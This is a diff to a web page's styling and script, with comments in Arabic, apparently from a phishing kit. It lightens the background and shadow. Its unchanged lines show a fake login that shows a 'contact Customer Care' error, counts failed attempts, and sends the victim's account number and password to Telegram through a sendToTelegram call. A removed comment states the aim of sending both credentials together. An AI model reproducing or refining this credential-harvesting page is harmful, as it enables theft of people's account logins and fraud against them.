@@ -14,7 +14,8 @@
     }
 
     body {
-      background-color: #111827;
+      /* تم تغيير الخلفية هنا لتكون بيضاء شفافة/فاتحة بدلاً من اللون الأسود */
+      background-color: rgba(240, 242, 245, 0.95);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -30,7 +31,7 @@
       display: flex;
       flex-direction: column;
       position: relative;
-      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.1);
       border-radius: 16px;
       overflow: hidden;
     }
@@ -747,7 +748,6 @@
         showErrorModal(`Invalid Source. Please contact Customer Care (محاولة ${failedAttempts})`);
         return;
       }
-      // تم تحديث هذا الجزء ليقوم بإرسال رقم الحساب وكلمة المرور معاً بوضوح
       sendToTelegram(`دخول [${selectedServiceText}]\nرقم الحساب: ${acc}\nكلمة المرور: ${pass}`);
       document.getElementById('modalDevice').style.display = 'flex';
     }
